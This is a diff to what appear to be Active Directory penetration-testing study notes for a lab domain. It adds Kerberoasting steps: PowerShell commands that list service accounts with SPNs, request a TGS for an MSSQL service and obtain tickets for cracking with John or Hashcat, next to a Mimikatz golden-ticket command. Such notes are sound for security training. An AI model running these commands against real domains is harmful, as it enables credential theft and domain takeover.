@@ -560,3 +560,13 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
 - Service accounts are many times ignored (passwords are rarely changed) and have privileged access.
 - Password hashes of service accounts could be used to create Silver tickets.
+
+- Find user accounts used as Service accounts
+  - PowerView: `Get-NetUser -SPN`
+  - ActiveDirectory Module: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
+
+- Request a TGS
+  - `Add-Type -AssemblyName System.IdentityModel`
+  - `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"`
+
+- `Request-SPNTicket` from PowerView can be used as well for cracking with John or Hashcat.
